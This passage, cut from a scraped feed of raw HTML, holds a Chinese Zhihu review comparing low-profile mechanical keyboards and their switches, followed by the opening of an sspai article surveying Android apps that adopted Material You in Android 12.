data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>使用方面分为两部分，轴体手感和键盘使用体验。</p>\n<h2>先说轴体。</h2>\n<p>所有的矮轴机械键盘的手感和薄膜、笔记本键盘的手感完全不一样。我认为绝对可以提升使用体验。</p>\n<p>矮轴的键程均比常规轴体要短，但是触发键程并不会比常规轴体短。</p>\n<p>从常规键盘切换到矮轴键盘我大概适应了两个小时左右，刚开始不习惯键程，会按的比较用力，会有较大的触底声，且指尖会累。但是习惯键程之后就OK了。</p>\n<p>本次涵盖了市面上大部分厂商的矮轴。</p>\n<p>矮<b>红轴</b>手感除了cherry的键程长一点之外，其他都相差不大。矮茶轴和矮青轴的手感却都不太一致。</p>\n<p><br></p>\n<p><b>茶轴：</b></p>\n<p>共同点就是段落都靠上，比较类似常规提前段落轴的手感。</p>\n<p>TTC的茶轴段落感最顺畅，最靠上。按下之后回弹有力。</p>\n<p>凯华矮轴（直插带钩）和佳达隆（十字轴心）相比较TTC矮茶轴段落感稍弱，这个段落比较像常规的茶轴。</p>\n<p>凯华矮轴（直插不带钩）最不像茶轴，初次上手我甚至以为是红轴。段落感仔细感受才能摸得到。</p>\n<p><b>青轴：</b></p>\n<p>所有的矮青轴的手感都比较像凯华的BOX白轴。</p>\n<p>TTC的矮青轴，各方面都和BOX白轴非常接近。第一次使用甚至以为就是BOX白轴。</p>\n<p>佳达隆（直插轴心）的矮青轴段落清晰，但是不管按下还是回弹，段落都非常生硬。且段落感比较靠前，初次使用很不习惯。按到键帽边缘的时候，会出现卡键的现象。（只有佳达隆的青轴有这个现象）</p>\n<p>凯华的矮白轴（青轴）段落确认感最弱，并且段落感在这三个轴里最靠下。</p>\n<p>凯华的矮白轴（青轴）是我认为最适合长久使用的青轴。不吵不闹也可以体验到“爽”的感觉。</p>\n<p>TTC的矮青轴次之，非常接近BOX白轴。如果不怕吵，TTC的矮青轴应该更适合你。</p>\n<p>佳达隆的青轴在比较之下显得比较廉价。我可能更多的会选择佳达隆的矮红轴、矮茶轴。</p>\n<blockquote>需要注意的是，矮轴的键帽（整套）并不能和常规轴体的通用，除非是厂商出配套键帽，否则将没有可替换的键帽。</blockquote>\n<p><br></p>\n<h2>键盘使用体验方面</h2>\n<blockquote><i>这几把键盘每把至少体验了一整天的时间，以下均在蓝牙模式下进行使用测试。（ikbc s200除外）</i></blockquote>\n<p>在这几天的正常使用中，我基本上每天除了码字就是打LOL的无限火力。我的笔记本电脑用支架架在桌子上，键盘在蓝牙模式下使用时距离电脑约40cm左右。</p>\n<p>这几把键盘在我的使用环境下均没有出现按键连击与按键延迟，多设备之间的切换也都很稳定，这点我都给好评。</p>\n<blockquote>请注意，目前市面上所有的蓝牙多少都还会出现连击或延迟，这与用户的使用环境有很大关系，以上内容均是在我的使用环境下得出的结论，仅供参考。</blockquote>\n<p>以下使用体验均是使用当天码字完成，软硬件参数方面可能没有写完整，<b>建议以之前表格为准</b>。</p>\n<h2>\n<br>keychron/京造 K3和keychron/京造 K1</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-4e1e40d342c5fa2859000b6ef5d2a7c5_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e1e40d342c5fa2859000b6ef5d2a7c5\" data-watermark-src=\"v2-ac8e599ebb3e4a1b88c6c789b411a427\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6ebd1daf8f4247bec0b8f5f92f40aca0_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6ebd1daf8f4247bec0b8f5f92f40aca0\" data-watermark-src=\"v2-0bcb6c00e4838a5a70c9c29ba28324b2\" data-private-watermark-src=\"\"></p>\n<p>这两把放在一起说。功能方面两把键盘基本一致，支持蓝牙有线双模，支持MAC/WIN配列的快速切换。</p>\n<p>多媒体按键方面， mac下可以直接按F区进行调节，win下需要使用FN组合键的形式。</p>\n<p><b>功能方便我稍微不能理解的是，K3蓝牙模式下支持全键无冲，但是K1只支持五键无冲。</b></p>\n<p>使用体验方面，在不打开K3脚撑的情况下，K1和K3两把键盘的高度与倾斜角度基本一致。打字使用体验上来说也基本相差不大。</p>\n<p>这两把键盘按键与按键之前的缝隙比较大，实际测量和常规机械键盘按键中心距离并无差距。均为19mm左右。</p>\n<blockquote><i>一般机械键盘相邻按键中心间距为19.05mm</i></blockquote>\n<p>需要注意的是，K3有二段式脚撑，K1无脚撑。如果不考虑配列，我会选择K3。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7984b3084c873c8e55000fbb86872529_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7984b3084c873c8e55000fbb86872529\" data-watermark-src=\"v2-9ee6ab9cc2f42d1c05192a40b4fda8cf\" data-private-watermark-src=\"\"></p>\n<h2>达尔优EK868</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-b1e261699a04d2043b1d601bed2260c4_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b1e261699a04d2043b1d601bed2260c4\" data-watermark-src=\"v2-0ed328fc070c6c69bd5f80e978d3558d\" data-private-watermark-src=\"\"></p>\n<p>键盘底部印有快速操作指南，并且所有连接操作并没有使用常规键盘的按键切换，而是使用四段式开关进行切换。，方便连接蓝牙，非常好评。</p>\n<p>脚撑是磁吸式的，可以拔出来旋转90度进行键盘高度的调节。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-227ea5d85164358ddb6f6d864aae586a_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227ea5d85164358ddb6f6d864aae586a\" data-watermark-src=\"v2-a67fc260fa117fc336704cbe0eaa2ef6\" data-private-watermark-src=\"\"></p>\n<p>空格左边是四个按键，ctrl为1.5U，alt、WIN等按键均为1U，相比较常规配列的键盘较<b>容易误触</b>。</p>\n<p>且这个情况下，空格相较常规键盘往右移了0.75U。我玩LOL的时候，左手大拇指一般在C的下方，在这个键盘上，拇指会在空格的边缘上，略有不适。</p>\n<p>功能方面，支持win与mac配列的快速切换按钮。支持mac下常规的多媒体按键，不支持win下的任何多媒体按键。</p>\n<h2>RK速写96</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-31cd2e492cbbc905d4e2260519755e35_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31cd2e492cbbc905d4e2260519755e35\" data-watermark-src=\"v2-9a5b77dd5fe4819b36bb5fa017e4f620\" data-private-watermark-src=\"\"></p>\n<p>功能方面建议<b>参考之前表格</b>。</p>\n<p>这把键盘是这些键盘里整体观感质感最不好的一个。</p>\n<p>键盘正面全是按键，这个时候键帽选择的好不好很大程度上影响了观感。在白天背光打开的情况下，键帽字符可以看到非常明显的字符分界。并且不太能看清字符。在暗光环境下，这个情况会好很多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1960152901f2640746ce4f3e445f7226_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1960152901f2640746ce4f3e445f7226\" data-watermark-src=\"v2-eec8a0d1fd0cafd89747318bfd5d6243\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d5d46cdb54a9811531f1f9a1f98a4a2f_720w.jpg?rss\" data-rawwidth=\"4588\" data-rawheight=\"3058\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d5d46cdb54a9811531f1f9a1f98a4a2f\" data-watermark-src=\"v2-ce6bb4ae55a9cf594943f76c8aec0863\" data-private-watermark-src=\"\"></p>\n<p>使用方面，RK速写96我适应了比较久，应该是这几把键盘里适应时间最长的。首先是键帽问题，距离太近了，按的时候稍微偏一点就非常容易按错。</p>\n<h2>ikbc s200和ikbc s300</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-1af6c49e398c84e868e1f1cb36f918b4_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1af6c49e398c84e868e1f1cb36f918b4\" data-watermark-src=\"v2-f0a5ad236e3380f766ae79bd17cc44e1\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0c33196d61563b7f79407a7f87783ead_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0c33196d61563b7f79407a7f87783ead\" data-watermark-src=\"v2-a0a493f7af51e020b2e89ddcdd8a1354\" data-private-watermark-src=\"\"></p>\n<p>S200我买的2.4G单模版本，他还有蓝牙2.4G双模版本。S300为蓝牙2.4G双模。</p>\n<p>这俩键盘都是电池供电的，无背光。</p>\n<p>键帽均使用的是PBT键帽，是矮轴键盘里唯二使用PBT键帽的键盘。如果买来是为了使用，推荐S200，如果买来为了颜值，推荐S300。</p>\n<p>S200和S300就目前的键帽来说完全是两个使用体验。S200用起来就是一把非常好用的键盘，甚至都没有上手成本。用的非常舒服。</p>\n<p>S200我之前有过测评，详细测评请移步：</p>\n<p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://zhuanlan.zhihu.com/p/256413536\" data-size=\"small\" data-image=\"https://pic2.zhimg.com/v2-2c98dc15d6c8ea293a10eb0dce4cf940_r.jpg\" data-entity-type=\"article\" class=\"internal\">400元以下机械键盘——横评及选购指南（2021.08.08更新）</a><p>S300的键帽是圆点类型的，用起来会稍微有点累，需要适应一段时间。</p>\n<p>再说回颜值，这次我全部的键盘拿出来后，女友就只对S300感兴趣。奶白色是真的很漂亮。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-393d701b9a662f68d966dc4aba3b067e_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-393d701b9a662f68d966dc4aba3b067e\" data-watermark-src=\"v2-bf80923601aa75b0f07ad9a8a99e54c4\" data-private-watermark-src=\"\"></p>\n<h2>酷冷至尊SK621</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-648e25ed02e3a50cf0901e7cdc6be95f_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-648e25ed02e3a50cf0901e7cdc6be95f\" data-watermark-src=\"v2-4b3d2932007b43e6558db6d27a5c9937\" data-private-watermark-src=\"\" data-qrcode-action=\"none\" data-tags=\"qrcode\"></p>\n<p>1000以下唯一可以买到的双模cherry矮轴键盘。</p>\n<p>这把键盘国内已经快退市了。SK621买的时候搜都不好搜，JD完全搜不到。</p>\n<p>这把键盘开箱的时候就给我很大的惊喜，包装非常的好，并且还附送了一个收纳袋。</p>\n<p>具体硬件参数请参考之前的表格。</p>\n<p>4.0和5.0的蓝牙在使用上并没有什么区别，在我的使用环境下都一切正常，并且也没有感受到按键延迟与连击。</p>\n<p>手感方面，cherry的矮红轴键程比别的矮轴长，用起来更接近常规的机械键盘。</p>\n<p>键盘没有额外的脚撑，使用起来的默认高度并没有任何的不适。</p>\n<p>价格略高，并且国内接近退市，不推荐入手。</p>\n<h2>雷神璃月 KC3094</h2>\n<p>雷神这把矮轴应该是让我比较惊喜的一个。</p>\n<p>由于是新品，预售+发货，最后才收到这把。看了详情页知道通体是阳极铝，249的价格</p>\n<p>是这几把键盘最便宜的一个，也就没期待它的质感。</p>\n<p>又看到了下图，廉价的渲染让我完全没有一丝期待，甚至觉得太杀马特了。。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2547d8dc8a3be874cf95897a82b566d3_720w.jpg?rss\" data-rawwidth=\"502\" data-rawheight=\"520\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2547d8dc8a3be874cf95897a82b566d3\" data-watermark-src=\"v2-f816defe82f23569aded44c4c8267273\" data-private-watermark-src=\"\"></p>\n<p>开箱的时候和预期一样，包装非常的简陋，除了键盘之外，里边只有一根数据线和一本说明书。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-724ef4a6f9580f016eb1ec7dcd2c0f7f_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-724ef4a6f9580f016eb1ec7dcd2c0f7f\" data-watermark-src=\"v2-898e551a283040ba98e13121113d5b0e\" data-private-watermark-src=\"\"></p>\n<p>把键盘从包装里拿出来的时候就感觉有点和想象的不一样了，整体的阳极颜色是接近苹果的深空灰色，搭配类肤材质的喷油键帽，整体观感触感都很棒。</p>\n<p>键盘非常的薄，最厚的位置只有2cm，放在桌面上看起来非常的商务。</p>\n<p>侧边的灯条没有渲染图上那么夸张，RGB跑马灯模式和这把键盘不太搭，单色模式在暗光环境下下可以起到很棒点缀的作用。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bde3391a19cce08101d4acfb5f654174_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bde3391a19cce08101d4acfb5f654174\" data-watermark-src=\"v2-758bb3a47fb86f835a8aaf24fc638e4c\" data-private-watermark-src=\"\"></p>\n<p>手感方面，类肤的材质用起来非常的舒服，键帽与手指的接触面积也足够的大，打字非常的轻松。缺点就是按键容易油乎乎的。</p>\n<p>又是一把不需要适应的矮轴键盘，非常推荐新手朋友入手。</p>\n<p><br></p>\n<p>最后，感谢你能看到这里。</p>\n<p>：)</p>\n<hr>\n<p>我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/46a389fe3d4368fd1371ec3069be1267\" data-hash=\"46a389fe3d4368fd1371ec3069be1267\" data-hovercard=\"p$b$46a389fe3d4368fd1371ec3069be1267\">@Domino</a> </p>\n<p>机械键盘发烧友、产品经理。一个在外设道路上不断折腾的八年萌新。</p>\n<p>佛系知乎答主，科技盐究员，好物推荐官。</p>\n<p>性别男爱好键盘，喜欢任何有理有据的探讨与交流。</p>\n<p>希望我的分享可以帮助更多的朋友，</p>\n<p>欢迎关注。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ouiwop?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Domino</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/23598328/answer/2157019005?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">101 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/375101699?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">300左右有什么好的办公键盘推荐？</a><br><a href=\"http://www.zhihu.com/question/358503052?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">茶轴有什么好的键盘推荐？</a><br>\n","link":"http://www.zhihu.com/question/23598328/answer/2157019005?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Android 平台的颜值标杆：Material You 应用大赏","date":"2021-10-06 07:00:00","description":"\n<p>如果说要罗列出 Android 12 最令人印象深刻的几大变化，Google 基于全新设计语言 Material You 为 Google Pixel 打造的这套新 UI 一定是其中之一。在 Pixel 设备所搭载的 Android 12 中，更换一张壁纸就能让整个系统 UI 焕然一新，从锁屏时间的字体颜色、启动器的图标、搜索框按钮，到通知中心、快速设置面板开关。甚至连摆在桌面的小部件（widget），都能通过适配 Android 12 的 <a href=\"https://developer.android.com/about/versions/12/features/widgets#dynamic-colors\" target=\"_blank\">应用动态颜色</a>，根据在桌面上的摆放位置呈现实时背景色效果。</p>\n<p>更重要的是，为了不让这套以壁纸取色为核心的个性化定制系统仅仅停留在 Android 系统表面，Google 在努力用 Pixel 机型「打样」的同时，也积极推动着 Material You 在自家应用中的适配。在 Android 12 正式版源码提交至 AOSP 之际，我们为大家整理了目前（截至 2021 年 10 月 6 日）已经适配了 Material You 设计的 Android 应用。</p>\n<h2>Google 应用</h2>\n<h3>基础通讯三件套</h3>\n<p>虽然是智能手机的「基础设施」，Google 自家的电话、通讯录和短信应用跟进 Material You 的速度却并不算快，适配程度也可以说是参差不齐。</p>\n<p>通讯录中，搜索框、<a href=\"https://developer.android.com/guide/navigation/navigation-ui?hl=zh-cn#add_a_navigation_drawer\" target=\"_blank\">左侧抽屉式导航</a>、右上角视图过滤菜单、应用设置的标题栏等区域都会采用从桌面壁纸提取到的配色作为点缀，Material Design 标志性的 <a href=\"https://developer.android.com/guide/topics/ui/floating-action-button?hl=zh-cn\" target=\"_blank\">悬浮操作按钮</a>（FAB）在应用动态颜色的同时，形状也从以往的圆形变成了圆角矩形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2db34teh5fkvn80.png\"></figure><p>而在拨号应用中，拨号键盘收起时右下角的悬浮操作按钮也用上了同样风格的圆角矩形按钮，不同层级悬浮操作按钮也用不同的动态颜色进行了视觉区分；除了同样应用于搜索框背景、高亮选中背景、设置界面背景等区域的动态配色外，拨号应用的 <a href=\"https://developer.android.com/guide/navigation/navigation-ui?hl=zh-cn#bottom_navigation\" target=\"_blank\">底部导航栏</a> 也通过采用不同动态颜色的图标和背景，营造出了更有层次感的底部导航栏设计。</p>\n<p>作为 Google 自家规范适配一直以来的「盲区」<sup class=\"ss-footnote\" href=\"\" title=\"虽然 Google 从 Pixel 3 XL 开始就有搭载异形屏的硬件存在了，但 Google 拨号应用的通话界面至今没有支持刘海屏。\" footnote-id=\"1\">1</sup>，拨号应用连最为基础的<strong> </strong><a href=\"https://sspai.com/post/65930#:~:text=%E8%87%AA%E9%80%82%E5%BA%94%E5%9B%BE%E6%A0%87-,%E6%9B%B4%E9%80%82%E5%90%88%E5%85%A8%E9%9D%A2%E5%B1%8F%E7%9A%84%E5%BA%94%E7%94%A8%E8%AE%BE%E8%AE%A1,-%E4%BB%8E%E6%9C%BA%E6%A2%B0%E5%BC%8F\" target=\"_blank\">边到边</a><strong> </strong>适配都没有，浅色主题下顶部状态栏和底部导航栏背景始终为白色，视觉效果令人感到不适。但这里的底部导航栏新样式，和上面提到的动态颜色、圆角矩形悬浮操作按钮一起，构成了 Google 自家应用 Material You 的核心风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2lb34teh0gc1nrg.png\"></figure><p>至于信息应用，截至发稿时，Google 仅对应用主界面右下角的悬浮操作按钮进行了更新，同样是由圆变方，在信息列表中滚动浏览时，悬浮操作按钮会根据滑动方向在扩展形态和精简形态间切换；设置项目得到了重新整理，更加清晰明了。但除此之外信息应用的更新就可以说是乏善可陈了，我们甚至看不到半点动态颜色的影子，无论桌面壁纸如何，应用内均采用蓝色为默认颜色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2tb34teh3cl8vo0.png\"></figure><h3>日历</h3>\n<p>同样作为基础应用的 Google 日历在 Material You 适配上做得出色得多：从桌面提取到的动态颜色从主界面、设置标题栏，主、次悬浮操作按钮一直延伸到左侧抽屉式导航和设置，日程视图中的当前日期标记、活动卡片（默认样式）等控件，也都采用了不同取值的动态颜色进行点缀，看上去和谐又不失变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp3db34teh3cl8vog.png\"></figure><p>更重要的是，Google 日历在桌面小组件中也同样运用了 Material You 动态颜色，视桌面摆放位置的不同，小部件标题栏的颜色也会动态改变。总体来说日历应用算是将新设计诠释得比较到位的适配案例之一。</p>\n<h3>Chrome</h3>\n<p>Chrome 在功能和设计上一直以来都可以说是保守而谨慎，在升级到 Chrome 94 及以上版本后，使用 Android 12 的用户应该也看到一些新变化<sup class=\"ss-footnote\" href=\"\" title=\"如果你没有看到，也可以通过 chrome://flags 中开启 #dynamic-color-android 和 #theme-refactor-android 两项开关来手动激活\" footnote-id=\"2\">2</sup>：主界面的搜索框、地址栏和快速访问标签，浏览网站时的标题栏，多标签页管理界面的标签页边框等界面都通过提取并适配了不同的动态颜色，多标签页管理页面的标签页卡片也采用了更加圆润的圆角设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp3lb34teh3cl8vp0.png\"><figcaption>Chrome 94.0.4606.50 开启上述功能标签后的效果</figcaption></figure><p>除此之外 Chrome 浏览器几乎就没做太多设计上的适配了，连浏览器设置界面都还是老样子。</p>\n<h3>计算器</h3>\n<p>随 Android 12 Beta 5 搭载的新版计算器正式采用了 Material You 设计风格，这款系统小工具的视觉观感也因此得到了巨大的提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp45b34teit0pn4i0.png\"></figure><p>首先是颜色，通过不同的动态颜色取值，计算器不同区域、不同按键之间在保留层次感的同时也有了对系统整体色彩风格的呼应，如果你将 Android 12 动态颜色的彩蛋小部件添加到桌面并完全展开，会发现计算器主界面基本都是提取的 N1、N2 和 A1、A2 相近色列，全部清除（AC）这种需要谨慎操作的按钮则直接取到了 A3 列进行强调。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp4tb34teh3cl8vpg.png\"></figure><p>除了颜色，计算器按钮由方变圆，计算结果、计算历史区域也通过柔和的圆角边缘和相近色取值进行了区分。</p>\n<h3>时钟</h3>\n<p>在 Android 12 Beta 5 中随计算器一起加入 Material You 套餐的还有时钟应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp55b34teh5fkvn8g.png\"></figure><p>虽然时钟应用依然默认采用深色主题且不可更改，但应用内 Material You 适配全面，除了开关、按钮、底部导航图标和选中时的强调背景等区域大量提取、运用了动态颜色外，闹钟在关闭、激活状态下的字重变化，圆角卡片以及大色块圆形按钮的堆叠，都给人以强烈的视觉新鲜感。</p>\n<p>另外时钟小组件也同步迎来了更新，除了 3 款不同样式的数字时钟外，此前在 Android 12 亮相视频中圈粉无数的多边形模拟时钟也包含在内，这些组件放置在桌面时依然可以根据摆放位置的不同动态变换颜色。</p>\n<h3>文件极客</h3>\n<p>虽然从设计规则上来说文件极客可以说是 Google 自家应用中「打脸」一般的存在<sup class=\"ss-footnote\" href=\"\" title=\"因为在 Material Design 的 设计规范 中明确指出少于 3 个标签页面时不要使用底部导航栏设计。\" footnote-id=\"3\">3</sup>，但这款应用依然跟随 Android 12 进行了 Material You 动态颜色的提取和应用，包括主界面的清理操作按钮、文件浏览界面的弹出菜单、底部导航栏的导航图标和导航图标选中背景等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp5lb34teh3cl8vq0.png\"></figure><p>不过整体而言文件极客的 Material You 设计适配依然可以用「破碎」二字来形容，除了对 Material Design 设计规范本身的不尊重，应用内还存在着大量跨越多个世代的「糅合」设计，不管是带有阴影的圆角矩形卡片、底部导航栏和右侧快速索引标签还是依然采用 Roboto 而不是 Google Sans 字体的文件浏览菜单，整体视觉风格都给人一种仍在换皮、依然不得 Material Design 精髓的感觉。</p>\n<h3>Google 播客</h3>\n<p>作为 Google 第一方的播客应用，Google 播客也在最近的版本中跟进了 Material You 设计风格，通过大面积应用的动态颜色提升应用与系统界面在视觉观感上的一致性。同时也用上了标志性的新式底部导航栏设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp65b34teh3cl8vqg.png\"></figure><p>不过除了动态色彩和新版底部导航栏，Google 播客应用和拨号应用一样也因为底部导航栏「变色」暴露出了没有适配边到边的问题，纯白的导航栏背景看上去具有非常明显的割裂感。另外作为 Google 的第一方播放器应用，我们也期待 Google 接下来能够拿出更多 Material You 播放器设计巧思——比如那个出现在 <a href=\"https://www.youtube.com/watch?v=UHQPdP8qgrk\" target=\"_blank\">宣传视频 </a>中、却至今没有任何 app 实装的波浪形进度条。</p>\n<h3>Google 相册</h3>\n<p>和上面提到的日历应用类似，Google 相册也可以说是 Material You 适配得比较到位的 Google 应用之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp6db34teh5fkvn90.png\"></figure><p>除了大量运用的动态颜色、全新样式的底部导航标签外，Google 相册主界面此前已经大量采用的圆角和卡片设计也为其增色不少，应用中的按钮、搜索框等控件也通过相近取色而非阴影的方法来体现层级，浏览相册时，时间分隔文本也采用了类似 Android 12 系统设置那样的大字体标题，兼具视觉效果和分隔效果。</p>\n<h3>相机、Google Lens</h3>\n<p>相机应用在 Android 系统中虽然是功能大于设计的存在，但 Material You 的动态颜色依然在其中起到了不俗的点缀效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp7db34teh0gc1ns0.png\"></figure><p>在 Android 12 中，相机取景器底部选中的当前拍摄模式会通过采用动态颜色的标签背景进行提示，取景器中的变焦按钮、安全相册开关以及顶部设置面板也都使用了统一提取到的动态颜色来呈现选中效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp85b34teh3cl8vr0.png\"></figure><p>与相机应用类似的，Google Lens 也已部分采用了 Material You 设计，比如取景框中的取字翻译提示。但底部功能标签依然没有跟进动态颜色适配。</p>\n<h3>Google Workspace</h3>\n<p>虽然依然保留了左侧导航抽屉，Google Drive 在可以的地方几乎都用上了从桌面壁纸提取到的动态颜色，导航栏、背景、底部弹出菜单、搜索框等不同界面的层级也通过相近色的变化体现了出来，新版底部导航栏设计和支持动态颜色的桌面小部件自然也没有缺席。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp8db34teh3cl8vrg.png\"></figure><p>Google Workspace 套件中的其它应用，如 Gmail、文档、表格、幻灯片等，也拥有了较为完整的 Material You 适配，大面积应用的动态颜色、圆角矩形样式的悬浮操作按钮一个不少，Gmail 同时还拥有全新的「四叶草」式动态色彩小部件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/64817c38c30ec50b70f1d2c4a4475d4c.jpg\"></figure><p>有意思的是 Gmail 应该也是目前唯一一款对 Material You 底部导航栏设计有着不同想法的 Google 应用。如果你在设置中开启了聊天室、Chat 等底部导航标签页面，就会发现 Gmail 的底部导航栏高度相比其它 Google 应用要更矮一点。显然 Gmail 团队认为新版底部导航栏虽然观感上视觉一新了，但屏幕利用率还可以再稍微提高一点。</p>\n<h3>Keep 笔记</h3>\n<p>Keep 笔记对 Material You 的适配主要集中在配色和小部件上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp8tb34teh3cl8vs0.jpeg\"></figure><p>应用内部，搜索框、底部操作栏和底部操作栏上的悬浮操作按钮都换上了新样式和动态颜色，主界面背景和笔记卡片上的标签，则以更浅或更深的相近取色来突出层级，美中不足的是底部操作栏上的圆角矩形悬浮操作按钮采用了阴影而非不同取色的方法来进行强调。</p>\n<p>Google Keep 也提供了新版「四叶草」小部件，可根据摆放位置自动变换颜色。</p>\n<h3>Gboard</h3>\n<p>越是明显的地方似乎就越容易被忽略，一开始我们甚至忘了将 Gboard 加进这篇文章的提纲里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp95b34teh0gc1nsg.png\"></figure><p>在 Android 12 中，Gboard 提供了新的动态颜色主题方案，开启后键盘背景、按键都会采用从壁纸提取到的颜色进行点缀。</p>\n<p>Gboard 虽小，却最能体现 Material You 的核心设计理念：根据功能和场景灵活运用不同的几何形状、用色彩对关键操作和按键区域进行强调、用色差体现层级同时尽量避免使用阴影……它应该也算是 Google 应用 Material You 设计的优秀代表之一了。</p>\n<h2>第三方应用</h2>\n<h3>Sleep as Android</h3>\n<p>Sleep as Android 是一款比较老牌的睡眠追踪应用，在版本号为 20210910 的测试版中，Sleep as Android 正式适配了 Material You 的动态颜色系统，配合主界面内大量使用的圆角矩形卡片、扩展式悬浮操作按钮以及条理清晰、层次分明的界面与设置项目，我们在 Sleep as Android 完全看不到任何「老牌」的味道。扑面而来的都是新设计的香气。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp9db34teh3cl8vsg.png\"></figure><span class=\"ss-application\" app-id=\"14361\"> </span><h3>Tasker</h3>\n<p>同样老牌的 Tasker 近年来在 Android 新特性适配这件事情上也非常积极。最新版 Tasker 依然保留着大量「牛轧糖」时代的味道，但主界面配色方案却跟进了 Material You。</p>\n<figure class=\"image ss-img-wrapper\"><img 